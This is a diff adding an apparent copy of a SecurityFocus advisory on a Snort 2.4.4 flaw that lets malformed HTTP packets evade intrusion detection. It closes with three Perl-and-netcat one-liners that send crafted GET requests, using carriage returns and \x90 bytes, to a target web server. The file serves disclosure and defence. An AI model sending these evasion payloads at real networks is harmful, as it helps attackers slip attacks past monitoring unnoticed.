@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/18200/info
+
+Snort is reportedly prone to a vulnerability that may allow malicious packets to bypass detection. 
+
+A successful attack can allow attackers to bypass intrusion detection and to carry out attacks against computers protected by Snort.
+
+This vulnerability affects Snort 2.4.4. Other versions may be vulnerable as well.
+
+perl -e'print "GET /www.example.com?paramter=|backdoor\r http/1.0\r\n\r\n"'|nc vulnerable.server 80
+
+perl -e 'print "GET \x90\x90\x0d http/1.0\r\n\r\n"'|nc 192.168.1.3 80
+
+perl -e 'print "GET \x0d/index.php\x90\x90 HTTP/1.0\n\r\n"'|nc 192.168.1.3 80
